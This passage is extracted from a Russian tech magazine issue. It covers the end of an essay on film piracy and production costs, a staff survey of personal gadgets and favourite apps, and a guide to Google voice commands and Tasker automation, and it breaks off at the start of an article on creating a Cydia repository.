                                                            снователем TPB
                                                         Питером Сунде. Она
                                                         хорошо демонстри-
                                                                          рует, что число ска-
                                                           чиваний пиратских
                                                           копий нельзя просто
                                                                взять и умножить на
                                                             цену компакт-диска,
                                                           чтобы подсчитать
                                                           убытки




Но и пираты вызывают мало симпатии. Быть может, кто-то помогает раздавать
фильмы из чисто идейных соображений, но нередко идеологией оправдывают
откровенно меркантильные мотивы. Если ты еще думаешь, что те же «Рутре-
кер» или The Pirate Bay — это оплоты революционной борьбы с подлыми копи-
растами, то спешу тебя разочаровать: если на высокопосещаемом сайте или
в популярной программе есть баннеры, значит, это бизнес. И в данном случае
он построен на продаже плодов чужого труда, в том числе и труда собствен-
ных пользователей. Откуда взяться теплым чувствам?
   Более важный вопрос: действительно ли пиратство «убивает кинемато-
граф», или просто студиям выгодно распускать пугалки? Пираты обычно оправ-
дывают свою деятельность, ссылаясь на второй довод. Он верен, но сложно
спорить и с тем, что без денег не снять зрелищных и увлекательных фильмов.
   Начнем с сериалов, с ними все просто. Платный стриминг — это единствен-
ная надежда на то, что вещи типа «Остаться в живых», «Игры престолов» и «Хо-
дячих мертвецов» будут возможны в посттелевизионную эпоху. Выходом, в тео-
рии, мог бы стать краудфандинг. Действительно, фанаты телешоу готовы
жертвовать миллионы долларов, но по киношным меркам это копейки: несколь-
ко миллионов может стоить съемка всего одной серии высокобюджетного
сериала.

СКОЛЬКО СТОИТ СНИМАТЬ КИНО
Одна серия «Игры престолов» стоит от 5 до 10 миллионов долларов (в сред-
нем — 6 миллионов). Одна серия Lost («Остаться в живых») — порядка 4 мил-
лионов, Breaking Bad («Во все тяжкие») — 3 миллиона. Есть и более дешевые
сериалы, но редко дешевле, чем один-два миллиона долларов за серию, если
речь не о ситкоме.
  Можно ли столько набрать на «Кикстартере»? Вот свежий пример: авторам
давно закрытого сериала «Вероника Марс» удалось набрать на продолжение
5,7 миллиона долларов (минимум для финансирования было нужно два мил-
лиона). Казалось бы, вот он, способ финансировать сериалы. Но, во-первых,
деньги тут давали не на новое кино, а на продолжение старого и полюбивше-
гося, а во-вторых, авторы собирали не на новый сезон, а на полнометражный
фильм (то есть, по сути, последнюю серию длиной 90 минут).
  О том, сколько стоит твой любимый фильм, ты без труда узнаешь на любом
сайте о кино. «Марсианин», к примеру, обошелся в 100 миллионов долларов,
и это далеко не рекорд — многие мультфильмы Pixar стоят вдвое дороже.



Конечно, большое кино часто окупается за счет показов в кинотеатрах, но,
во-первых, не любое и не всегда (и ведь за провалы тоже кто-то должен пла-
тить), а во-вторых, деньги идут не только на съемки, но и на работу самой инду-
стрии, в первую очередь — на поиск и воспитание талантов. Да, усадьбы, яхты
и спортивные автомобили тоже имеют место, но кто их заслуживает больше:
Тарантино или Ким Дотком?
  При этом бороться с пиратством законодательно — на вид здравая, но на
деле крайне проблемная идея. Лоббируемые правообладателями антипи-
ратские законы зачастую ущемляют права на распространение информации
в принципе, и под их эгидой могут вводить политическую цензуру.
   Бороться с пиратством созданием удобных сервисов, которые его за-
менят, — куда более мудрое решение. В идеале нужно лишь две вещи: пер-
вая — удобный и доступный метод смотреть любой фильм или сериал, вторая —
люди, которые бы платили за такой сервис, даже имея доступ к бесплатным
аналогам. Увы, сама возможность существования и того и другого — под вопро-
сом.
MOBILE





                                                                                    Евгений Зобнин
                                                                                                   zobnin@gmail.comГАДЖЕТЫ
          ][КОМАНДЫ
КАКИМИ СМАРТФОНАМИ, ПЛАНШЕТАМИ
И УМНЫМИ ЧАСАМИ ПОЛЬЗУЮТСЯ
СОТРУДНИКИ ЖУРНАЛА
Читая наш журнал, особенно многочисленные статьи
рубрики X-Mobile о рутинге, джейлбрейке, архитектуре
Android и настройке производительности, ты мог поду-
мать, что все мы здесь пользуемся рутованными смарт-
фонами с несколькими операционками и взломанными
айфонами с кучей софта для вардрайвинга. Если так, то
добро пожаловать под кат, ибо там ты узнаешь, что на са-
мом деле предпочитают использовать сотрудники ][,
находясь вдали от дома. И это вовсе не Blackphone
и не нексусы на базе CyanogenMod.

INTRO
Как редактор рубрики мобильных технологий, я просто не мог не интересо-
ваться, какими гаджетами и почему пользуются сотрудники ][. Так личный ин-
терес перерос в полноценный опрос, который и представлен твоему внима-
нию. Вопросов я задал всего два:
1. Какой смартфон, планшет, умные часы ты используешь (почему эта модель
   и эта ОС)?
2. Топ-5 приложений, которые ты в первую очередь устанавливаешь на свои
   девайсы.

Очень просто и, казалось бы, совсем неинтересно. Но не спеши с выводами!
Два обычных вопроса вскрыли не просто предпочтения ребят, но и их убежде-
ния, отношение к современным технологиям, а где-то даже жизненную фило-
софию. Думаю, что по ответам можно даже составить психологический пор-
трет человека, а может, и узнать смысл жизни, вселенной и всего такого.
            АЛЕКСАНДР «DR.» ЛОЗОВСКИЙ,
            РЕДАКТОР РУБРИК КОДИНГ, MALWARE
                Телефон — Sony Xperia Z3 Compact. До этого несколько
                   лет пользовался Samsung Galaxy Nexus и продолжал бы
                  в том же духе, если бы он не разбился. Поэтому новый те-
                лефон подбирал по схожим параметрам, диагонали (4,6)
                 и разрешению (1280 х 720, HD).
                   Телефон очень тонкий и изящный и при этом держит за-
                  ряд трое с лишним суток (я не смотрю видео, но звоню и чи-
                 таю достаточно). Считаю это офигенным и удивляюсь, что
                 Sony никак не обыгрывает эту тему в своей рекламе, — мне
                    кажется, это важнее водостойкости. Разумеется, всем сове-
                  тую CyanogenMod — после годика Cyanogen’а смотреть на
                     кучу бессмысленных предустановленных программ сил нет.
                  Планшет — iPad 2 (внезапно). На нем я только читаю
                  книги и журналы, и что мне в нем нравится, так это опять
                же аккумулятор. Годы использования не сильно подточили
                  его ресурс, чего не скажешь о китайском Pipo M1, у кото-
                 рого аккумулятор ушатался буквально за полтора года.
                     Как и все приличные люди, я обожаю заказывать китай-
                  ское барахло, и самое главное, что мне в нем не нравит-
                      ся, — это как раз аккумуляторы. Они там обычно полное
                    фуфло... и, чтобы в этом в очередной раз убедиться, я за-
                  казал в Китае планшет Android + Windows 10, жду его уже
                месяц с лишним, так что, возможно, в него уже некоторое
                время играет какой-нибудь кочегар «Почты России».
   Смарт-часов у меня пока нет (жду их вместе с планшетом ;). Я заказал часы
с пульсометром, GPS, датчиком УФ и прочим, но думаю, что поиграюсь и не буду
их систематически носить. Все-таки часы для меня — это механическая классика.
  Из браслетов у меня есть Xiaomi Mi Band, посмотреть было интересно, но
смысла для меня лично в нем нет. Я в основном езжу на велосипеде (у меня
работа в восьми километрах от дома, и на машине мне эти восемь киломе-
тров ехать час, а от трамвая — идти почти полтора километра), эта нагрузка
браслетом не учитывается. А количество шагов в сутки мне неинтересно. Ум-
ный будильник мне тоже не нужен, поскольку в 7:00 я встаю без будильника,
а вставать в 6:45 на основании того, что браслету покажется, будто в это время
я буду более свежим... спасибо, нет.
  Я не использую телефон для хакерских и кодерских свершений, поэто-
му мои пять приложений — FBReader (хорошая читалка, к которой я привык),
Dr.Web (антивирус), World Newspapers (читалка новостей), ну и сервисы от Ян-
декса — Навигатор, Карты, Такси.
АЛЕКСЕЙ ГЛАЗКОВ,
ВЫПУСКАЮЩИЙ РЕДАКТОР
Я в целом не доверяю мобильным устрой-
ствам: на них невозможно работать, неу-
добно экспериментировать и сложно даже
толком развлечься. Поэтому все, что касается ра-
боты и безопасности данных, происходит на ноуте,
а мобилки используются как быстросаппорт.
  Ярый приверженец идеи «телефон — чтобы звонить»,
поэтому смартфона нет. Пользуюсь исключительно линей-
кой Xenium компании Philips. Сейчас ношу двухсимочный кирпич
Philips Xenium X1560, который держит заряд по месяцу, до этого была
абсолютно шикарная раскладушка Philips Xenium 9@9q (которую, к со-
жалению, сняли с производства).
  Умные часы считаю полной ерундой (не ношу часов вообще), но план-
шет — это удобно. Обычно повсюду хожу с «мужской сумкой», в которой лежат
предметы первой необходимости (аптечка и жгуты, мультитул и швейцарский
нож, газовый баллончик, флешка, USB-переходники, моток веревки, изолента
и прочие полезные вещи), так что iPad 2 в такой компании чувствует себя весь-
ма комфортно. Почему iPad 2 — потому что из всех планшетов, какими поль-
зовался, неубиваемым оказался только он. Остальные так или иначе сдохли.
Хотя еще не пробовал iPad Air 2.
   Как понятно из написанного выше, все приложения — для iPad:
1. MAPS.ME — оффлайн-карты, незаменимые в незнакомой стране. Объехал
   с ними полмира.
2. Hotspot Shield VPN: самый приличный VPN для iPad. Если не хочется пла-
   тить, можно поставить SurfEasy VPN.
3. Panic Prompt 2 — отличный SSH-клиент. В сочетании с VPN позволяет рабо-
   тать достаточно удобно и безопасно.
4. Textastic — редактор кода. Использую и для быстрокода, и для работы
   с MD-статьями, и просто для заметок.
5. Dropbox — без него любой планшет — мертвый груз, годный разве что на
   игрушки и серфинг в инете.
АНДРЕЙ ПИСЬМЕННЫЙ, ШЕФ-РЕДАКТОР,
РЕДАКТОР PC ZONE И СЦЕНЫ
С устройствами у меня все скучно. iPhone 6, iPad третьего
поколения, Apple Watch с недавних пор.
   Программы:
•  Inbox — новая гугловская почта, на которую я серьез-
   но подсел и стал регулярно чистить «Входящие», чего
   много лет не делал. Возможность собирать почту
   в подшивки по заданным правилам полезна невероят-
   но. К примеру, пресс-релизы я теперь смахиваю одним
   нажатием, пробежавшись глазами по заголовкам.
•  Byword — рабочий текстовый редактор, который ис-
   пользую как на компьютере, так и на мобильных устрой-
   ствах. Поддерживает Markdown, синхронизируется по
   iCloud, считает знаки и не делает больше ничего при-
   мечательного. Вдохновлен iA Writer, но десктопная вер-
   сия имеет пару важных отличий.
•  Things — планировщик, который сочетает внешнюю
   простоту с определенной мощью. Позволяет исполь-
   зовать GTD, но не насаждает его. Не хватает только
   шейринга, так что для списка покупок приходится дер-
   жать еще и Wunderlist (который тоже по-своему неплох).
•  Reeder —  наверное, самая  приятно выглядящая
   и удобная читалка RSS для iOS и OS X. А если в каче-
   стве бэкенда использовать платный Inoreader с филь-
   трами и правилами, то и одна из самых мощных.
•  Soulver — лучший калькулятор в мире: позволяет пи-
сать вычисления в строки и ссылаться из одной строки на
результат другой. Поддерживает кучу операторов, в том
числе переводы мер и величин, конвертацию валют, ло-
гические операции, тригонометрию и так далее. Но для
быстрой конвертации валют и величин (без вычислений)
обычно использую Angstrom — еще одну не лишенную ге-
ниальности программу.

Ты просил не упоминать твиттер, но тем не менее. Tweetbot
(а не официальный клиент) — одна из самых используе-
мых мной программ на всех устройствах.
ПАВЕЛ КРУГЛОВ, РЕДАКТОР UNIXOID,
SYN/ACK, X-TOOLS
Основной мобильный девайс сейчас — Nexus 5, до
этого был Nexus 4, ну вы поняли. Полностью стоко-
вый Android мне нравится больше всего, плюс об-
новления приходят оперативно. А вот с будущим
смартфоном пока непонятно. Nexus 6 они сде-
лали слишком лопатообразным, а следующее
поколение со сканером отпечатков пальцев
мне не позволяют купить голоса в моей го-
лове. Поэтому лучше варианта, чем Nexus 5,
я пока не вижу.
  Планшетом  перестал   пользоваться
с момента покупки Nexus 4. Был Samsung
Galaxy Tab P1000 — самый первый адек-
ватный Android-планшет на то время. Не-
давно включал, до сих пор работает! Но медленно.
Я к тому, что какие-то мелкие вещи вполне можно сделать на те-
лефоне, а для длительной работы ноутбук все же удобнее. Умными часами/
браслетами/кольцами/тапками не пользуюсь по причине их бесполезности.
  Приложениями пользуюсь по большей части стандартными и всем извест-
ными, из полуизвестных могу отметить:
•  Asana — таск-менеджер команды ][;
•  Evernote — заметки, особенно удобно, если пользуешься на нескольких
   устройствах;
•  Feedly — читалка RSS, пользуюсь с момента закрытия аналогичной от
   Google;
•  Google Sky Map — полезная вещь, если у тебя есть телескоп, — направля-
  ешь телефон на небо, видишь на экране названия звезд, планет, галактик.
            ЕВГЕНИЙ ЗОБНИН,
            РЕДАКТОР РУБРИКИ X-MOBILE
              Мой основной, если можно так выразиться, смартфон —
                  это огромная лопата китайского производства под назва-
                нием OnePlus One. При начинке, сопоставимой с Nexus 5X,
                 и цене в 250 долларов он отличается от среднестатисти-
                  ческой китайщины отличным качеством сборки, перво-
                классными комплектующими, официальной поддержкой
                             CyanogenMod (собственно, он и вышел
                                на рынок с предустановленной Cyanogen
                              OS) и большим комьюнити хакеров и раз-
                                  работчиков. Идеальный выбор (после
                                   нексусов) для всех более-менее продви-
                                 нутых пользователей. Из минусов я бы
                                отметил разве что отсутствие беспрово-
                              дной зарядки, из-за чего мой Qi-совме-
                              стимый зарядник, оставшийся от Nexus
                                          4, валяется без дела :(.
                                   Также довольно часто я пользуюсь не-
                                вероятно древним, но зато практически
                              неубиваемым Motorola Defy с прошивкой
                                      MIUI. Он компактный и отлично подходит
                                на роль звонилки, с которой и искупаться
                               не страшно. До этого были все нексусы,
                              кроме пятого и шестого. iPhone исполь-
                              зую только для экспериментов и считаю
iOS неудобной и чересчур урезанной ОС, которая без джейлбрейка напоми-
нает скорее игрушку, чем полноценную ось.
  Умные часы и планшеты я считаю ошибкой технического прогресса, а по-
тому не пользуюсь вовсе, если, конечно, не считать часы Omate TrueSmart. Но
они не совсем подпадают под определение «умных часов» в принятом на се-
годня понимании. Фактически это полноценный Android-смартфон c SIM-кар-
той, камерой и GPS в форм-факторе часов. Отличная альтернатива смартфо-
ну во время бега, велопрогулок и вылазок на природу, главное — не забыть
зарядить гарнитуру/наушники :).
   Что касается приложений, мой топ-5 выглядит так:
1. Action Launcher — наиболее удобный для меня домашний экран с двумя
   очень интересными функциями: выдвигаемой с левой стороны экрана па-
   нелью запуска приложений и концепцией Cover вместо папок: в один ярлык
  можно вложить другие, обычный тап откроет приложение, свайп — покажет
   остальные ярлыки.
2. Pocket — читалка статей с веб-сайтов. С помощью расширения для Chrome/
    Firefox сохраняешь статью, затем открываешь ее на любом мобильном
   устройстве, сервер Pocket обрезает все лишнее, так что остается только
   текст статьи и картинки. 90% статей я читаю с его помощью.
3. FeedMe — отличный клиент для RSS-агрегатора Feedly. Намного быстрее
   и приятнее официального клиента.
4. MultiBoot Manager — позволяет установить вторую операционку рядом
   с основной. Must have для экспериментаторов.
5. Dropsync — позволяет синхронизировать выбранные Dropbox-папки на лету
   (на манер десктопной версии Dropbox), очень удобно при расшаривании
   книг с компа на несколько девайсов.
ИЛЬЯ РУСАНЕН,
ГЛАВНЫЙ РЕДАКТОР ][
Девайсы — iPhone 6 и iPad mini 2. Из
Android-гаджетов есть Nexus 5 и Nexus 7.
Но основной набор — это iPhone и iPad.
К современному Android отношусь хоро-
шо, просто, когда я выбирал между Android
и iOS, первый был корявой поделкой с кри-
вым рендерингом шрифтов, а вторая —
уже нормальной ОС. С тех пор так и привык
к Apple. Сегодня Android-девайсы в ра-
боте не использую, только «Хакер» на них
проверяю.
  В iOS мне нравится несколько вещей:
1. Закрытость. Если не джейлить, то iOS от-
   носительно закрыта, безопасна и шанс
   случайно отхватить малварь ниже, чем на Android. Отсутствие сторонних
   маркетов, жесткая модерация в App Store, урезанные права приложений —
   все это говорит в ее пользу. При этом при всей закрытости необходимые
  вещи вроде VPN или стороннего хранилища паролей с автозаполнениями
   в iOS поддерживаются на системном уровне.
2. Экосистема. iOS-аппликухи спроектированы качественнее, чем Android-
   аналоги. В отличие от Google, Apple предъявляет жесткие требования к при-
   ложениям еще на этапе модерации. В App Store тяжело пропихнуть малварь
   или кривой апп, который крашится при старте (ведь нет такой фрагментации).
3. Продуманность. Лично для меня iOS удобна из коробки, а Android — нет.
   Соответственно, его придется допиливать. Я не хочу разбираться, какой
   лаунчер поставить в Android или какой скрипт написать в Tasker, не хочу ду-
   мать о каких-то прошивках, загрузчиках и рутах. Купил телефон — хочу ре-
   шать свои задачи, а не огрехи ОС исправлять.

Не пойми неправильно, но я смотрю на гаджеты как на рабочий инструмент.
Вот десктоп — совсем другое дело. Там я могу неделями допиливать что-ни-
будь, настраивать и автоматизировать. Получаю нереальный гиковский фан от
возни с настольными OS/серверами. С мобильным девайсами такого драйва
нет, поэтому и желания эффективно тратить свое свободное время на уста-
новку лаунчеров тоже :).
   Аппликухи:
1. OpenVPN. Это удобный VPN-клиент, использую его в паре с OpenVPN Access
   Server в AWS. Позволяет хранить несколько профилей, переключаться меж-
   ду ними и удобно импортировать файлы конфигов .ovpn. Must have для на-
   стоящего road warrior’a.
2. 1Password. Это лучший менеджер паролей. Никакие другие даже не при-
   близятся по функциональности к 1Password. Логины, заметки, файлы, при-
   ватные ключи, лицензии — он умеет хранить все, надежно шифрует и син-
   хронизируется даже с микроволновкой.
3.  Parallels Access. Это отличный клиент удаленного доступа к компу. Про-
   думано все: свой нативный файловый менеджер, различные разрешения
   экрана, жесты, мультизадачность, даже Gaming Mode! Это первый клиент
   удаленного доступа, на котором можно не только переслать себе забытый
   файл, но и полноценно работать.
4. Slack, Asana. Первое — это сервис командной работы, второе — очень
  мощный таск-менеджер. Редакция «Хакера» работает в этих двух инстру-
   ментах, поэтому они нужны постоянно. Но даже не по работе я составляю
   задачи, пишу заметки и идеи на будущее в Asana. Помогает разгрести за-
   дачи, спланировать дела и отслеживать, что я сделал, а что нет. Но конечно,
   это просто клиенты, имеет смысл их использовать только в паре с десктоп-
   ной версией.
5. vSSH. Это продвинутый SSH-клиент. Очень продуманный и удобный, уме-
   ет отдавать логи через iTunes, хранить профили, passphrase, не рвет сес-
  сию при сворачивании. Очень хорошо реализована клавиатура: отдель-
   ной строкой наверх вынесены все часто используемые в консоли клавиши
   вроде F1–12, Tab, обратных кавычек. В работе с консолью поддерживаются
   свайпы, скролл, все очень нативно.
В ЗАКЛЮЧЕНИЕ
Как видишь, вполне можно быть крутым кодером, взломщиком и спецом в *nix
и при этом пользоваться простым смартфоном, древним iPad 2 или вообще
ходить с простой звонилкой. Большинству из нас это просто не нужно, так как
гораздо удобнее и проще все делать с ноутбука или небольшого нетбука, ко-
торый по размерам не сильно превосходит тот же iPad.
  С другой стороны, рубрика X-mobile не существовала бы в том виде, в кото-
ром существует сейчас, если бы все думали так. Лично для меня смартфон —
это отличный инструмент, способный если не полностью, то частично заменить
полноценный ПК. Самое главное — «правильно его приготовить» и использо-
вать правильный софт. Лично я получаю неимоверное количество фана от ко-
выряния прошивок и тюнинга параметров ОС и знаю, что таких, как я, огром-
ное множество. В конце концов, многие из нас жили во времена, когда Palm’ы
были недосягаемой мечтой, а сейчас у нас есть мобильные ПК, сопоставимые
по мощности с до сих пор продающимися бюджетными ноутбуками. Неразум-
но использовать такие мощности только для чтения новостей и игр.
MOBILE
СМАРТФОН,





                                                                Дмитрий «BRADA»
                                                                       Подкопаев
                                                                                   john.brada.doe@gmail.comФАС!


                    ИСПОЛЬЗУЕМ
                    ГОЛОСОВОЕ
                      УПРАВЛЕНИЕ
                      НА ПОЛНУЮ
                       КАТУШКУ
Корпорация Google начинала свою деятельность как по-
исковик, и на данный момент поиск информации с помо-
щью мобильных устройств так и остается одним из глав-
ных направлений развития. С каждым обновлением
системы телефона/планшета, Google Play Services и от-
дельных программ появляется все больше новых функций,
призванных облегчить жизнь пользователю. В этой статье
я расскажу о наиболее полезных голосовых командах,
контекстном поиске Now on Tap, а также покажу, как на-
строить телефон для выполнения любых голосовых ко-
манд, в том числе с помощью Tasker. Ведь именно об этом
мы так мечтали, читая произведения фантастов в детстве.

Традиционно  все  новейшие  разра-
ботки от «корпорации добра» внедря-
ются на устройствах линейки Nexus.
Так было и с голосовым управлением,
и с Google Now, системой подачи ин-
формации в виде набора карточек. За
Google Now, простой поиск Google и го-
лосовой поиск отвечает одно приложе-
ние, это Google. Оно входит в комплект
стандартных приложений от компании
Google и доступно на любом сертифи-
цированном Android-смартфоне.
   Ранее голосовое управление акти-
вировалось только при нажатии на зна-
чок микрофона при открытой програм-
ме поиска (или на виджеты на рабочем
столе). Затем появился лаунчер Google
Старт, который позволил выполнять го-
лосовые команды прямо с рабочего
стола (с помощью фразы «Ok, Google»).
Начиная с Android 4.4 та же возмож-
ность стала доступна и в других лаунче-
рах, но только при условии, что лаунчер
явно поддерживает такую возможность
(почти все популярные лаунчеры под-
держивают).                               Настройки голосового поиска
   Также существует несколько смартфонов с продвинутой функцией голосо-
вого управления, активируемой, даже если экран смартфона выключен. На-
пример, MOTO X содержит отдельный процессор с очень низким энергопо-
треблением, который только и занимается, что в фоновом режиме слушает все
окружающие звуки на предмет ключевой фразы.





Виджет поиска на рабочем столе

ГОЛОСОВЫЕ КОМАНДЫ
Простой поиск информации, конечно же, самая главная функция Google Now.
Причем он достаточно интеллектуален, чтобы понимать контекст, а значит, ко-
манды можно объединять в цепочки. Например, если сказать: «О’кей, Google,
кто президент Никарагуа?», то поиск выдаст ответ «Даниэль Ортега». А если
далее спросить «Сколько ему лет?», то ответ будет «Семьдесят лет». Google
Now понимает массу команд, приведу десять наиболее полезных.
• Карты и навигация — «поехали/навигация #название_улицы #номер_
   дома». Запустит Google Maps в режиме навигатора по указанному адресу.
   Также можно указывать город, магазин, организацию и так далее.
• Калькулятор — «тринадцать процентов от пяти тысяч». Выдаст ответ и фор-
   му калькулятора в окне поиска. Голосом можно надиктовывать сложение,
   вычитание, умножение, деление, корень числа. Также можно переводить
  меры весов, длин и прочего.
• Отправка СМС/сообщений — «написать смс Олег текст я за рулем, пе-
   резвоню позже». Отправлять сообщения также можно через WhatsApp,
   Viber и еще несколько популярных мессенджеров. По упрощенной схеме
  можно диктовать «сообщение #программа #контакт #текст». Например:
  «сообщение WhatsApp Олег я за рулем». После этого также голосом можно
   подтвердить отправку командой «отправить».
• Набор номера — «позвонить маме». Также можно продиктовать произ-
   вольный номер, которого нет в записной книге. При команде «позвонить
   сестре/брату» можно указать номер из контактов (если записано по-друго-
   му), тогда в следующий раз набор будет проходить автоматически.
• Напоминания и будильники — «разбудить меня в субботу в восемь утра»
   или «напомнить мне выключить плиту через десять минут». Также можно до-
   бавлять мероприятия в Google-календарь. События можно привязывать не
   только ко времени, но и к месту. Если добавить «напомни мне распечатать
   текст на работе», то при включенной геолокации и указанном адресе ра-
   боты (места на карте) напоминание на телефоне всплывет автоматически.
  Обычный встроенный в приложение «Часы» таймер заводится так же легко.
• Угадай мелодию — «что это за песня». Запустит распознавание играю-
  щей музыки.
• Музыка/видео — «слушать (музыку) #группа #песня». Запустит указанную
   музыку в Play Music или клип на YouTube. Нормально работает с русскими на-
   званиями, но так как английские слова и исполнителей определяет, иногда
   неправильно интерпретируя под русский язык, то срабатывает не всегда.
• Фото/видео — «сделай фото / записать видео». Запустит камеру в выбран-
   ном режиме.
• Управление настройками — «выключи вайфай», «включи фонарик».
• Заметки — «заметка для себя тестовый пароль для сервиса один два три
   четыре». Добавит заметку в Google Keep.

NOW ON TAP
Описанию этого сервиса было уделено отдельное пристальное внимание на
презентации Android 6.0 Marshmallow. И преподносился он как одна из основ-
ных особенностей новой прошивки. Но более-менее нормальную функцио-
нальность в России мы получили только в декабре. В официальном русском
переводе он называется контекст от Now.
   Как это работает? «КогдавызапускаетеконтекстотNow,Googleанализи-
руетвсе,чтовывидитенаэкране,иищетинформациювсоответствиисэтими
данными»— вот официальное описание со страницы поддержки. На деле это
значит, что вместо того, чтобы выделять и копировать интересующие фразы на
экране, затем открывать поиск и вставлять фразу, можно просто нажать и удер-
живать кнопку «Домой». После этого Google предложит варианты для найден-
ных ключевых фраз. Это могут быть картинки, видео, предложение открыть
это место на картах, новости. Может предложить открыть сайт организации
или сделать звонок, открыть профиль Facebook или посмотреть Twitter-аккаунт
знаменитостей, добавить заметку. При наличии соответствующих приложений
на устройстве после тапа на иконке страница откроется сразу внутри прило-
жения. При прослушивании музыки из разных приложений можно одним нажа-
тием вызвать подробную информацию об исполнителях, альбомах, клипах на
YouTube и прочем.
Работа Now on Tap на примере «ВКонтакте»

ПАСХАЛКИ В ПОИСКЕ GOOGLE
Так же как и в десктопной версии поиска, в голосовом поиске есть пасхалки.
Приведу только несколько команд, остальные можешь узнать по этой ссылке.
К сожалению, почти все они срабатывают только на английском языке и с англий-
ским интерфейсом или при выбранном в настройках только английском языке.
  «Do a barrel roll».
   «Make me a sandwich!»
   «Sudo make me a sandwich!»
  «When am I?»
  «Beam me up, Scotty!»
   «Up up down down left right left right».
   «What does the fox say?»
TASKER
Если после всего прочитанного тебе все равно не хватает команд для вопло-
щения своих фантазий, то, имея немного времени, можно настроить Google
Now на выполнение практически любых команд. Для этого нам понадобятся
прежде всего Tasker и плагин AutoVoice.
  С помощью Таскера можно совершать множество действий: запускать при-
ложения, контролировать звук, запускать скрипты, управлять экраном, прово-
дить манипуляции над файлами, нажимать кнопки на экране, управлять media,
делать запросы HTTP Get и Post и реагировать на них, управлять расширенными
настройками телефона. И все это можно делать, отдавая голосовые команды.
А с помощью множества плагинов функциональность расширяется еще больше.
  Для начала работы необходимо включить пункт Google Now Integration внутри
AutoVoice. В Таскере необходимо создать отдельный профиль для каждой ко-
манды или группы команд. Как обычно, для составления профилей рекомендую
в настройках Таскера включать английский. Для тестового профиля составим го-
лосовую команду выключения звука. Для этого создадим новый профиль с пара-
метрами Event f Plugin f AutoVoice Recognized. Заполняем следующие поля:
• Command Filter — тут вводим необходимую голосовую команду, в нашем
   примере: «выключи звук». Если нажать на строку Speak Filter, то команду
  можно надиктовать.
•  Exact Command — если поставить галочку, то будет срабатывать только
   на точную команду, иначе может сработать на каждое отдельное слово или
  форму слова.
• Use Regex — использовать регулярные выражения. Позволяет настроить
   распознавание нескольких слов в одном профиле. Если в первом поле вве-
   сти «(выключи|выключить) (звук|громкость)» без кавычек, то профиль будет
   срабатывать на команды «выключи звук», «выключи громкость», «выключить
   звук» и «выключить громкость».

Для действия используем Audio f Ringer Volume и Audio f Notification Volume.
Для контроля срабатывания можно добавить всплывающее уведомление че-
рез Alert f Flash и в поле Text ввести «Выключил».
  Команды «выключи вайфай» работают сразу в Google Now, а «выключи звук»
предлагает открыть настройки. И после перехвата команды через Таскер и ее
выполнения все равно остается на текущем экране с запросом. Поэтому к дей-
ствиям дополнительно добавим App f Go Home. Ну а чтобы позабавить дру-
зей, во всех профилях для управления голосом можно первым действием по-
ставить Alert f Say и ввести фразу «слушаюсь, хозяин». Тогда телефон в ответ
на команды будет реагировать голосом.
     .





Настройка профиля                       Настройка действий

С помощью дополнительных плагинов, например AutoRemote, можно управлять
другими устройствами на Android. А если на комп поставить EventGhost, то с по-
мощью многочисленных плагинов можно сделать немало интересного. Одним
из самых полезных применений будет настройка умного дома, но это отдельная
большая история. У Жуана Диаса (Joao Dias), разработчика всех Auto*-плагинов,
есть также дополнение и для компа, что позволяет интегрировать управление
мобильными устройствами через голосовой помощник Cortana на десктопе.

НЕМНОГО ХИТРОСТЕЙ
Таскер — это хардкор. Можно творить потрясающие вещи, но для этого нужно
освоить много информации, разбираться в переменных, регулярных выражениях
и прочем. Для тех, кто не хочет возиться с Таскером, есть большое количество про-
грамм, которые используют возможности голосового управления, но имеют более
понятный и доступный интерфейс и просты в обращении. Остановлюсь на трех.
Open Mic+ for Google Now
Программа позволяет изменить ключевую фра-
зу с «Ok, Google» на любую другую. К сожалению,
после одного из обновлений сервисов и запро-
са от Google перестала работать с Google Engine,
оставив только PocketSphinx. В связи с этим для
ключевой фразы подходят только английские
словосочетания, но раньше можно было удив-
лять присутствующих обращением к телефону
«эй, ты» или «слушай команду».
   Тем не менее разработчик обещает все попра-
вить в следующих обновлениях. Из других функций
можно отметить запуск распознавания по датчику
приближения (два взмаха руки) и по встряске те-
лефона. Как и MOTO X, поддерживает распозна-
вание при выключенном экране, но, к сожалению,
это очень сильно отражается на батарее, поэтому
актуально для телефона на зарядке или автомо-
бильных медиацентров на Android с постоянным
питанием. Работает с Bluetooth-гарнитурой, име-  Open Mic+ for Google Now
ет интеграцию с Таскером, может зачитывать тек-
стовые сообщения.

Commandr for Google Now
Еще одна программа от разработчика Open Mic+.
Интегрируется с Google Now и позволяет исполь-
зовать расширенный набор команд. В списке под-
держиваемых есть следующие: включить/выключить
беспроводную точку доступа, приостановить/возоб-
новить музыку, следующая/предыдущая песня, не-
прочитанные СМС/gmail (озвучит их голосом), гром-
кость <х>, блокировка телефона, сделать снимок,
сделать селфи. Также можно включить диктофон,
управлять подсветкой, автоповоротом экрана. С ру-
том можно выключить/перезагрузить телефон, очи-
стить уведомления, включить режим «В самолете».
Для поддерживаемых функций можно менять коман-
ды на свои. Также имеет интеграцию с Таскером,
позволяя включить для каждой задачи срабатывание
по названию Task. Есть модуль для Xposed, позволя-
ющий использовать Commandr с Android Wear.       Commandr for Google Now
Ассистент Дуся
Ну и наконец, детище российских разработчиков — русскоязычный голосо-
вой ассистент Дуся, который объединяет в себе все преимущества описан-
ных приложений и утилит. Как и Tasker, Дуся позволяет создавать свои голосо-
вые функции (они называются «скрипты»), причем в намного более понятной
и простой форме (есть справка на русском, видеоуроки) и с более мощны-
ми функциями работы именно с речевыми командами. Вдобавок здесь есть
и свой онлайн-каталог готовых скриптов, созданных другими пользователями.
На момент написания статьи их было около ста.
   Так же как и Commandr, Дуся умеет интегрироваться с Google Now, а также
имеет множество видов других бесконтактных активаций — встряхиванием,
взмахом, гарнитурой, поднесением к уху и в том числе и своей фразой актива-
ции на русском. А если хочется использовать интерфейс, то и он есть, очень
простой, быстрый и функциональный. Среди функций есть 25 наиболее часто
востребованных, есть даже управление умными домами и домашними кино-
театрами.


                                                               Возможности
                                                                      ассистента
                                                                 Дуся
ВЫВОДЫ
Сегодня функции голосового поиска в смартфонах очень развиты, и, как ты
смог убедиться, разработчики предлагают нам не просто набор команд для
поиска информации, а полноценную систему управления смартфоном, кото-
рую при определенных усилиях можно интегрировать с домашним компом
и даже умным домом. Так что, если тебе удобнее управлять всем этим с помо-
щью голоса, у тебя есть для этого все необходимое.
MOBILE



МАГАЗИН ДЛЯ IOS
  СОЗДАЕМ CYDIA-РЕПОЗИТОРИЙ С НУЛЯ





                                    Михаил Филоненко
                                                mfilonen2@gmail.com
Ни для кого не секрет, что основным источником про-
